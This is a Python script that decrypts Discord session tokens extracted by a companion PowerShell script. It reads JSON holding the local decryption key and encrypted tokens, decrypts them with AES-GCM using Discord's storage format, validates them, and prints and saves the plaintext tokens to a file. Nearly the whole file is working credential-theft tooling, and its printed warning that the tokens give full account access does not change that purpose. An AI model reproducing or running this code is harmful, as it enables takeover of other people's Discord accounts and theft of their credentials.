#!/usr/bin/env python3
"""
Discord Token Decryptor - Reads from JSON file
Decrypts all tokens found by the PowerShell extraction script
"""

import json
import os
import sys
import base64
from datetime import datetime

def decrypt_discord_token(encrypted_token_b64, key_b64):
    """
    Decrypt a Discord token using AES-GCM
    """
    try:
        from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    except ImportError:
        return {"success": False, "error": "cryptography library not installed. Run: pip install cryptography"}
    
    try:
        # Decode from base64
        encrypted_data = base64.b64decode(encrypted_token_b64)
        key = base64.b64decode(key_b64)
        
        # Validate data lengths
        if len(encrypted_data) < 31:
            return {"success": False, "error": f"Encrypted data too short: {len(encrypted_data)} bytes"}
        
        if len(key) != 32:
            return {"success": False, "error": f"Invalid key length: {len(key)} bytes (expected 32)"}
        
        # Extract Discord's AES-GCM format components
        nonce = encrypted_data[3:15]  # 12 bytes nonce (skip first 3 bytes)
        ciphertext = encrypted_data[15:-16]  # Everything except first 15 and last 16 bytes
        tag = encrypted_data[-16:]  # Last 16 bytes are the authentication tag
        
        # Decrypt using AES-GCM
        aesgcm = AESGCM(key)
        combined_data = ciphertext + tag
        decrypted = aesgcm.decrypt(nonce, combined_data, None)
        
        decrypted_text = decrypted.decode('utf-8')
        
        return {
            "success": True,
            "decrypted_token": decrypted_text,
            "token_length": len(decrypted_text),
            "looks_valid": "." in decrypted_text and len(decrypted_text) > 50
        }
        
    except Exception as e:
        return {"success": False, "error": str(e)}

def validate_discord_token(token):
    """
    Check if a token looks like a valid Discord token
    """
    if not token:
        return False, "Empty token"
    
    # Discord tokens typically have 3 parts separated by dots
    parts = token.split(".")
    if len(parts) != 3:
        return False, f"Wrong format: {len(parts)} parts (expected 3)"
    
    # Check basic length requirements
    if len(parts[0]) < 20 or len(parts[1]) < 5 or len(parts[2]) < 20:
        return False, "Parts too short"
    
    return True, "Looks like valid Discord token format"

def main():
    print("🔐 Discord Token Decryptor - JSON Reader")
    print("=" * 60)
    
    if len(sys.argv) < 2:
        print("[!] ERROR: No input provided as argument.")
        sys.exit(1)

    # Parse the JSON string passed as the command-line argument
    try:
        data = json.loads(sys.argv[1])
    except json.JSONDecodeError as e:
        print(f"[!] ERROR: Failed to parse JSON input: {e}")
        sys.exit(1)


    # Display extraction info
    info = data.get('extraction_info', {})
    print(f"📁 Extraction Info:")
    print(f"   Timestamp: {info.get('timestamp', 'Unknown')}")
    print(f"   Discord Path: {info.get('discord_path', 'Unknown')}")
    print(f"   Files Scanned: {info.get('files_scanned', 0)}")
    print(f"   Tokens Found: {info.get('tokens_found', 0)}")
    
    # Get decryption key
    decryption_key = data.get('decryption_key', '')
    if not decryption_key:
        print("❌ Error: No decryption key found in JSON")
        return
    
    print(f"🔑 Decryption Key: {decryption_key}")
    
    # Process all tokens
    tokens = data.get('tokens', [])
    if not tokens:
        print("❌ No tokens found in JSON file")
        return
    
    print(f"\n🎯 Processing {len(tokens)} tokens...")
    print("=" * 60)
    
    successful_decryptions = []
    
    for token_data in tokens:
        token_id = token_data.get('id', 'Unknown')
        source_file = token_data.get('source_file', 'Unknown')
        base64_encrypted = token_data.get('base64_encrypted', '')
        length = token_data.get('length', 0)
        
        print(f"\n[Token {token_id}] from {source_file}")
        print(f"   Encrypted: {base64_encrypted[:50]}...")
        print(f"   Length: {length} characters")
        
        # Attempt decryption
        result = decrypt_discord_token(base64_encrypted, decryption_key)
        
        if result['success']:
            decrypted_token = result['decrypted_token']
            print(f"   ✅ DECRYPTION SUCCESS!")
            print(f"   🎉 Decrypted Token: {decrypted_token}")
            
            # Validate the token format
            is_valid, validation_msg = validate_discord_token(decrypted_token)
            if is_valid:
                print(f"   ✅ Validation: {validation_msg}")
            else:
                print(f"   ⚠️  Validation: {validation_msg}")
            
            successful_decryptions.append({
                'id': token_id,
                'source_file': source_file,
                'encrypted': base64_encrypted,
                'decrypted': decrypted_token,
                'is_valid': is_valid
            })
        else:
            print(f"   ❌ DECRYPTION FAILED: {result['error']}")
    
    # Summary
    print("\n" + "=" * 60)
    print("📊 FINAL RESULTS")
    print("=" * 60)
    
    if successful_decryptions:
        print(f"🎉 Successfully decrypted {len(successful_decryptions)} out of {len(tokens)} tokens!")
        
        valid_tokens = [t for t in successful_decryptions if t['is_valid']]
        if valid_tokens:
            print(f"\n✅ Valid Discord tokens ({len(valid_tokens)}):")
            for token in valid_tokens:
                print(f"   Token {token['id']}: {token['decrypted']}")
        
        print(f"\n⚠️  SECURITY WARNING:")
        print(f"   - These tokens provide full access to Discord accounts")
        print(f"   - Keep them secure and don't share them")
        print(f"   - Consider them compromised and regenerate if needed")
        
        # Save results to file
        with open('decrypted_results.json', 'w', encoding='utf-8') as f:
            json.dump({
                'timestamp': datetime.now().isoformat(),
                'total_tokens': len(tokens),
                'successful_decryptions': len(successful_decryptions),
                'valid_tokens': len(valid_tokens),
                'results': successful_decryptions
            }, f, indent=2)
        print(f"\n💾 Results saved to: decrypted_results.json")
        
    else:
        print("❌ No tokens could be decrypted successfully")
        print("\n💡 Possible reasons:")
        print("   1. Incorrect decryption key")
        print("   2. Corrupted or incomplete token data")
        print("   3. Different encryption method used")
        print("   4. Tokens are from older Discord versions")

if __name__ == "__main__":
    main()
